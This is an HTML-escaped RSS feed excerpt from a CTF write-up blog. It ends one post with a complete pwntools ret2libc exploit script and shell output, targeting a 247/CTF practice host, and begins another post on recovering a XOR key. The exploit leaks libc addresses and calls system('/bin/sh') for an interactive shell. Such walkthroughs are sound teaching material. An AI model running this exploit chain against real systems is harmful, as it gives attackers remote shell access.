&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; libc base address: 0xf7cf6000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Payload sent: 56B
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Interactive shell
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ls
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chall
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag_&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0-9&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;+.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ cat flag_&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0-9&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;+.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;247CTF&lt;span class=&#34;o&#34;&gt;{[&lt;/span&gt;a-f0-9&lt;span class=&#34;o&#34;&gt;]{&lt;/span&gt;32&lt;span class=&#34;o&#34;&gt;}}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;pwntools&#34;&gt;pwntools&lt;/h2&gt;
&lt;p&gt;This blog post is already long enough, so I&amp;rsquo;ll only show how &lt;code&gt;exploit-remote.py&lt;/code&gt; script looks when ported to pwntools. I&amp;rsquo;ll leave all details up to you but the library is pretty straightforward:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;hostname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ad520e503a0ec4e0.247ctf.com&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;50341&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hostname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;non_executable_stack&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;libc6-i386_2.27-3ubuntu1_amd64.so&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2C&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Payload sent: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;B&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;puts_leak&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;u32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts leaked address: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{:#x}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;puts_leak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;puts_leak&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;libc base address: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{:#x}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_exit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;exit&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;search&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2C&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Payload sent: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;B&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>247/CTF - Crypto - An Exclusive Key</title>
      <link>https://duroz.github.io/post/247ctf-crypto-exclusive-key/</link>
      <pubDate>Tue, 19 May 2020 00:00:00 +0000</pubDate>
      <guid>https://duroz.github.io/post/247ctf-crypto-exclusive-key/</guid>
      <description>&lt;p&gt;Hi all! This is my first blog post ever, I&amp;rsquo;ll try to write every post self-explanatory and explain every detail involved. This time is about the third challenge of cryptography of the platform &lt;a href=&#34;https://247ctf.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;247/CTF&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;challenge-description&#34;&gt;Challenge description&lt;/h2&gt;
&lt;p&gt;We&amp;rsquo;re given an exclusive_key file with the following description:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We XOR encrypted this file, but forgot to save the password. Can you recover the password for us and find the flag?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;At first sight, we can&amp;rsquo;t see any repetition, so it seems there is no clue about what xor key was used for encryption:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ md5sum exclusive_key
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;e1078ca347364828a43a40bd55c937f2  exclusive_key
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ xxd exclusive_key &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; head
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000000: 0e15 730c &lt;span class=&#34;m&#34;&gt;1712&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2233&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2718&lt;/span&gt; 5a15 5f5d 5c68  ..s...&lt;span class=&#34;s2&#34;&gt;&amp;#34;3&amp;#39;.Z._]\h
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;00000010: 050b 405b 5914 065d 5846 400b 4100 090a  ..@[Y..]XF@.A...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;00000020: 570c 4015 085b 5d0e 1014 5b22 3a21 4641  W.@..[]...[&amp;#34;&lt;/span&gt;:!FA
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000030: &lt;span class=&#34;m&#34;&gt;0756&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1041&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5658&lt;/span&gt; 105f 1b0f &lt;span class=&#34;m&#34;&gt;4044&lt;/span&gt; 170a 6f0d  .V.AVX._..@D..o.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000040: &lt;span class=&#34;m&#34;&gt;5150&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5252&lt;/span&gt; 5d69 590e &lt;span class=&#34;m&#34;&gt;5716&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5518&lt;/span&gt; 055c 560f  QPRR&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;iY.W.U..&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000050: &lt;span class=&#34;m&#34;&gt;4151&lt;/span&gt; 437e &lt;span class=&#34;m&#34;&gt;7613&lt;/span&gt; 2f25 4f00 104e 0c3b 5e16  AQC~v./%O..N.&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;^.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000060: &lt;span class=&#34;m&#34;&gt;5017&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5853&lt;/span&gt; 0b7c &lt;span class=&#34;m&#34;&gt;0452&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5250&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4116&lt;/span&gt; 4e43 320a  P.XS.&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;.RRPA.NC2.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000070: 590b 445d 025d &lt;span class=&#34;m&#34;&gt;5641&lt;/span&gt; 1d40 5e37 &lt;span class=&#34;m&#34;&gt;3823&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4569&lt;/span&gt;  Y.D&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;VA.@^78#Ei
